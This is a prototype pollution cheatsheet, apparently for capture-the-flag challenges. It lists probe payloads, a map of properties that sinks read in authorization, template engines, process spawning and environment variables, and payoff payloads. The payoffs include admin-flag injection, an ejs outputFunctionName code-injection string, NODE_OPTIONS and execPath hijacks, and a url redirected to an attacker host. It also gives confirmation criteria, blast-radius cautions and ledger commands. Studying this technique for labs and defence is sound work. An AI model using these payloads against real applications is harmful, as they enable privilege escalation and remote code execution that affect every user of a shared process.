# Cheatsheet — the whole class on one screen

```
THE ONE-LINE CLASS
  recursive merge / dotted-path setter / rename operator / setattr-loop
  takes __proto__ | constructor.prototype | __class__-shaped keys
  and writes through to a SHARED ROOT (Object.prototype / class / globals)
  a later lookup reads the fallback you set

THE PROBE (always harmless first)
  {"__proto__":{"ppmarker":"v1"}}          flat JSON
  {"a":{"__proto__":{"ppmarker":"v1"}}}    nested
  {"constructor":{"prototype":{"ppmarker":"v1"}}}   alias
  ?__proto__[ppmarker]=v1                  qs
  __proto__[ppmarker]=v1                   form
  {"field":"__proto__.ppmarker","value":"v1"}  path-API
  then read a FRESH object for ppmarker   ({}).ppmarker === "v1"

PP-PROBE
  python3 tools/web/pp_probe.py --url <u> --method POST \
    --body '{"__proto__":{"ppmarker":"v1"}}' --readback <fresh-url>

CONFIRMS
  fresh object carries the marker OR a behavior changes through a
  documented fallback — never "request accepted"

REFUTES (all-arms-dead)
  - reserved keys rejected at parse or write
  - value coerced to string/null and no object lands
  - merge is shallow or uses defineProperty/Object.create
  - marker lands but NOTHING downstream reads a fallback for it

SINK→PROPERTY MAP (pollute the LEFT name)
  authz        isAdmin is_admin admin isAdminUser superuser staff
               isStaff role roles level kind type verified active
               enabled approved confirmed email_verified owner_id
               tenant_id org_id user_id uid sub
  ejs          outputFunctionName localsName destructureLocals
               escape escapeFunction client compileDebug root views
               filename basedir
  pug          name filename basedir root filters globals self
  handlebars   compat allowProtoPropertiesByDefault
               allowProtoMethodsByDefault extensions helpers partials
  nunjucks     autoescape globals filters extensions loader
  mustache     partials tags delimiters
  underscore   variable imports sourceURL evaluate interpolate escape
  spawn        shell env argv0 cwd stdio detached uid gid execPath
               execArgv workerData
  env vars     NODE_OPTIONS LD_PRELOAD PATH BASH_ENV ENV PYTHONPATH
               PERL5OPT RUBYOPT GIT_SSH_COMMAND EDITOR http_proxy
  request      url uri hostname host port path baseURL proxy agent
               headers rejectUnauthorized timeout callbackUrl
               webhook notifyUrl avatar image icon src href
  require      main paths extensions module modulePath specifier dir
  config       debug dev verbose development cache entry plugins
               middleware secret key cookie session uploadDir dest
               filename views "view engine" "trust proxy"
  python       __class__ __init__ __globals__ __builtins__ __import__
               os.environ keys SECRET_KEY DEBUG config attrs

THE PAYOFF SHAPES
  PP+authz      {"__proto__":{"isAdmin":true}}
  PP+ejs        {"__proto__":{"outputFunctionName":"x;CODE;var y"}}
  PP+shell      {"__proto__":{"shell":true}}
  PP+env        {"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x"}}}
  PP+exec       {"__proto__":{"execPath":"/tmp/node"}}
  PP+require    {"__proto__":{"main":"/tmp/x.js"}}
  PP+url        {"__proto__":{"url":"http://attacker/"}}
  PP+python     obj.__class__.__init__.__globals__[k]=v
  $rename       {"$rename":{"a":"__proto__.b"}}
  path-setter   set(obj, "__proto__.m", val)

THE CARRIERS
  JSON body > qs ?a[b]=x > urlencoded form > path-API param >
  update document field > header-to-obj reparse > cookie JSON >
  multipart field > websocket message > GraphQL input object

FALSIFIERS — stop when true
  - every carrier+path tried, fresh-object readback stays clean
  - the merge is defineProperty/Object.create/hasOwnProperty-guarded
  - the marker writes but is own-property only (mass-assignment)
  - no sink reads a fallback for any writable property name
  - the sink reads hasOwnProperty and the prototype is not checked

BLAST RADIUS
  - process-global in Node — every request of EVERY user inherits
  - use one harmless marker; record the write; plan the cleanup
  - restart/rollback the instance after impact proof
  - never $rename a shared collection's field without an own-id filter

RULE ONE
  the write is never the goal — the READ is. find the sink BEFORE
  the payload, then write the name the sink reads.
```

## Ledger lines that prove it

```bash
python3 tools/state.py <chal> --hypothesis "pp via merge at POST /update"
# run pp_probe arms — record each arm's result
python3 tools/state.py <chal> --hypothesis-id <id> --result refutes --status parked
python3 tools/state.py <chal> --hypothesis-id <id> --result confirms --status proven
# then flag-gate the payoff read
python3 tools/hooks.py pre-flag <chal> --value '<flag>' --evidence '<excerpt>'
```
